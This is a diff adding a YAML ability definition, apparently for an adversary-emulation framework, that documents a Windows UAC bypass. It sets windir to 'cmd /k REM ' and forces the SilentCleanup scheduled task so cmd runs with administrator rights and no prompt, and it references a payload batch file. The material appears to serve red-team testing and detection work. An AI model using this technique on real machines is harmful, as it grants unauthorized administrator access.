@@ -1,0 +1,36 @@
+---
+- id: f5b3567ab2ce990df9d1dab51853d4d9
+  name: Bypass UAC using SilentCleanup task
+  description: 'Bypass UAC using SilentCleanup task on Windows 8-10 using bat file
+    from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/
+
+
+    There is an auto-elevated task called SilentCleanup located in %windir%\system32\cleanmgr.exe
+    This can be abused to elevate any file with Administrator privileges without prompting
+    UAC (even highest level).
+
+
+    For example, we can set the windir registry kye to: "cmd /k REM "
+
+
+    And forcefully run SilentCleanup task:
+
+
+    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+
+
+    REM will tell it to ignore everything after %windir% and treat it just as a NOTE.
+    Therefore just executing cmd with admin privs.
+
+    '
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.002
+    name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
+  platforms:
+    windows:
+      cmd:
+        command: '"bc40cf_T1548.002.bat"'
+        payloads:
+        - bc40cf_T1548.002.bat
+        cleanup: ''
